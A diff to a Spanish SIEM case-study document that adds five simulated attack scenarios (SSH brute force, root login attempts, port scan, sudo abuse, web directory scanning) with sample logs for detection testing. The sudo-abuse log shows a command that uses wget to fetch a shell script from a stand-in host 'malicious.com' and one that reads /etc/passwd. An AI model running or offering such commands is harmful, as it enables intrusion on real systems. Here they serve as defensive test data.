@@ -1,4 +1,16 @@
+
+# 5. Casos de Estudio - Implementación Frontend
+
+> **Nota:** Los casos reales implementados en el frontend del sistema SIEM se encuentran en:
+> - `frontend/src/pages/Casos.jsx` - Interfaz visual con simulador
+> - `backend/app/routers/simulator.py` - Tipos de simulación para pruebas
+
+---
+
+## 5.1 Caso A: RENAPER (Argentina, 2021)
+
 ## 5.1 Caso 1: RENAPER (Argentina, 2021)
+
 
 ### 5.1.1 Descripción técnica del ataque
 
@@ -209,3 +221,107 @@ El ataque se diferencia por su enfoque en sistemas industriales y su capacidad d
 La baja visibilidad y la falta de logs convencionales dificultan su detección.
 
 Por lo tanto, se considera no prevenible directamente mediante un SIEM tradicional.
+
+---
+
+# Casos de Estudio - SIEM (Simulación)
+
+Esta sección contiene casos de ataques simulados para pruebas del sistema.
+
+---
+
+## Caso Simulado 1: Ataque de Fuerza Bruta SSH
+
+**Fecha:** 2024-03-15 14:32:00  
+**Severidad:** High  
+**IP Atacante:** 192.168.1.105  
+**Usuario Objetivo:** admin  
+**Descripción:** Múltiples intentos de login SSH fallidos detectados desde IP externa.
+
+### Logs Asociados
+
+```
+Mar 15 14:30:01 server1 sshd[12345]: Failed password for invalid user admin from 192.168.1.105 port 45231 ssh2
+Mar 15 14:30:03 server1 sshd[12347]: Failed password for invalid user admin from 192.168.1.105 port 45232 ssh2
+Mar 15 14:30:05 server1 sshd[12349]: Failed password for invalid user admin from 192.168.1.105 port 45233 ssh2
+Mar 15 14:30:07 server1 sshd[12351]: Failed password for invalid user admin from 192.168.1.105 port 45234 ssh2
+Mar 15 14:30:09 server1 sshd[12353]: Failed password for invalid user admin from 192.168.1.105 port 45235 ssh2
+Mar 15 14:30:11 server1 sshd[12355]: Failed password for invalid user admin from 192.168.1.105 port 45236 ssh2
+```
+
+---
+
+## Caso Simulado 2: Intento de Acceso Root
+
+**Fecha:** 2024-03-18 09:15:00  
+**Severidad:** Critical  
+**IP Atacante:** 10.0.0.50  
+**Usuario Objetivo:** root  
+**Descripción:** Intento directo de acceso como usuario root detectado.
+
+### Logs Asociados
+
+```
+Mar 18 09:14:55 server1 sshd[23456]: Failed password for root from 10.0.0.50 port 48291 ssh2
+Mar 18 09:15:01 server1 sshd[23458]: Failed password for root from 10.0.0.50 port 48292 ssh2
+```
+
+---
+
+## Caso Simulado 3: Escaneo de Puertos
+
+**Fecha:** 2024-03-20 16:45:00  
+**Severidad:** Medium  
+**IP Atacante:** 172.16.0.100  
+**Descripción:** Detección de escaneo de puertos múltiples en firewall.
+
+### Logs Asociados
+
+```
+Mar 20 16:44:00 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=22 SYN
+Mar 20 16:44:02 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=80 SYN
+Mar 20 16:44:04 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=443 SYN
+Mar 20 16:44:06 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=3306 SYN
+Mar 20 16:44:08 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=5432 SYN
+```
+
+---
+
+## Caso Simulado 4: Abuso de sudo
+
+**Fecha:** 2024-03-22 11:20:00  
+**Severidad:** Medium  
+**IP Atacante:** 192.168.1.50  
+**Usuario:** www-data  
+**Descripción:** Ejecución excesiva de comandos con privilegios sudo.
+
+### Logs Asociados
+
+```
+Mar 22 11:15:00 server1 sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/cat /etc/passwd
+Mar 22 11:16:00 server1 sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/ls /root
+Mar 22 11:17:00 server1 sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/wget http://malicious.com/shell.sh
+```
+
+---
+
+## Caso Simulado 5: Escaneo de Directorios Web
+
+**Fecha:** 2024-03-25 08:30:00  
+**Severidad:** Medium  
+**IP Atacante:** 203.0.113.25  
+**Descripción:** Acceso a rutas sensibles de aplicaciones web.
+
+### Logs Asociados
+
+```
+Mar 25 08:29:00 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:00] "GET /admin HTTP/1.1" 404
+Mar 25 08:29:02 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:02] "GET /phpmyadmin HTTP/1.1" 404
+Mar 25 08:29:04 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:04] "GET /.env HTTP/1.1" 404
+Mar 25 08:29:06 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:06] "GET /wp-admin HTTP/1.1" 404
+```
+
+---
+
+**Fin del documento**
+
